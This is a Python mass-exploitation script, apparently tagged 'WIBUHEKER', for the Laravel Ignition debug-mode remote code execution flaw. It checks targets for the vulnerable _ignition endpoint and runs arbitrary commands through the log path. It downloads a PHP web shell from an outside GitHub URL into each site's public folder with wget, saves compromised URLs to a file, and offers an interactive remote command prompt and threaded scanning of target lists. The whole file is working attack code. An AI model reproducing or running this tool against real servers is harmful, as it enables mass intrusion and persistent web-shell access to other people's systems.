### WIBUHEKER
### https://www.ambionics.io/blog/laravel-debug-rce
import re
import sys
import argparse
import readline
from color import Color
from exploit import Exploit
from thread import ThreadPool
def Mass(uri):
    try:
        Expl = Exploit()
        Expl.uri = f'{uri}/_ignition/execute-solution'
        if not Exploit.testPost(Expl.uri):
            print('[-] '+ Color.red(uri) + ' | Not Vuln.')
            return False
        getLog = Exploit.getLogpath(uri)
        if not getLog:
            print('[-] ' + Color.red(uri))
            return False
        path = getLog.replace(' ', '')
        Expl.logpath = path + '/storage/logs/laravel.log'
        if not Expl.pathExits():
            print('[-] ' + Color.red(uri) + ' | Log Path Does not exists.')
            return False
        if not Expl.run('echo WIBUHEKER'):
            print('[-] ' + Color.red(uri) + ' | Nope not vuln.')
            return False
        shell = Expl.run(f'wget https://raw.githubusercontent.com/rintod/toolol/master/payload.php -O {path}/public/shl.php | echo WIBUHEKER')
        if not shell:
            print('[-] ' + Color.red(uri) + ' | Cannot Execute Command For Upload.')
            return False
        check = Expl.run(f'ls {path}/public')
        if 'shl.php' in check:
            print('[+] ' + Color.green(uri) + '/shl.php | Goodboy.')
            Exploit.save('SHELL.txt', uri + '/shl.php')
        else:
            print('[+] ' + Color.yellow(uri) + '| Cannot Upload Shell.')
            Exploit.save('VULN.txt', uri)
    except Exception as e:
        print('[!] ' + Color.red(uri) + f' | Opps got error message {str(e)}')
        return False
if __name__ == '__main__':
    pars = argparse.ArgumentParser()
    pars.add_argument('-t', '--target', required=True, help='Target for exploit / file for mass exploit')
    pars.add_argument('-p', '--path', required=False, help='Log path of target')
    pars.add_argument('--thread', required=False, help='Threading if u use mass')
    args = vars(pars.parse_args())

    target = args['target']
    if 'http' in target:
        if args['path'] is None:
            try:
                check = Exploit.getLogpath(target)
                if check:
                    args['path'] = check.replace(' ', '') + '/storage/logs/laravel.log'
                else:
                    print(Color.red('Cannot find Logpath or No debug, please search manually.'))
                    sys.exit()
            except Exception as e:
                print(Color.red(str(e)))
                sys.exit()
        readline.parse_and_bind('tab: complete')
        readline.parse_and_bind('set editing-mode vi')
        exploit = Exploit()
        exploit.uri = f'{target}/_ignition/execute-solution'
        exploit.logpath = args['path']
        while True:
            command = input('Command > ')
            if command == 'exit':
                break
            try:
                if exploit.pathExits():
                    print(exploit.run(command))
                else:
                    print(Color.red('Path does not exists'))
                    break
            except Exception as e:
                print(Color.red(str(e)))
                break;
    else: 
        try:
            with open(target, 'r') as fp:
                lists = fp.readlines()
        except:
            print(Color.red(f"{target} File Not Found!"))
        
        if args['thread'] is not None:
            thread = int(args['thread'])
            Pool = ThreadPool(2)
            for uri in lists:
                uri = uri.replace('\n', '')
                if uri.endswith('/'):
                    uri = uri[:-1]
                Pool.add_task(Mass, uri)
            Pool.wait_completion()
        else:
            for uri in lists:
                uri = uri.replace('\n', '')
                if uri.endswith('/'):
                    uri = uri[:-1]
                Mass(uri)


        

